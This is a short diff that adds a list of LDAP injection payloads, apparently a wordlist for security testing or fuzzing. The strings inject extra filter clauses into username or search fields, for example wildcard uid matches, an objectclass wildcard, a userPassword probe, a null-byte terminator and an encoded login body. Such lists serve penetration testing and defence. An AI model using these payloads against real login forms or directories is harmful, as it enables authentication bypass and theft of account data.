@@ -1,0 +1,9 @@
+webtest)(&))
+*
+*)(uid=*))(|(uid=*
+Hacker, Wiley)(|(objectclass=*
+*))%00
+username=*)(%26&password=111
+printer)(uid=*)
+*)(|(userPassword=*
+1)
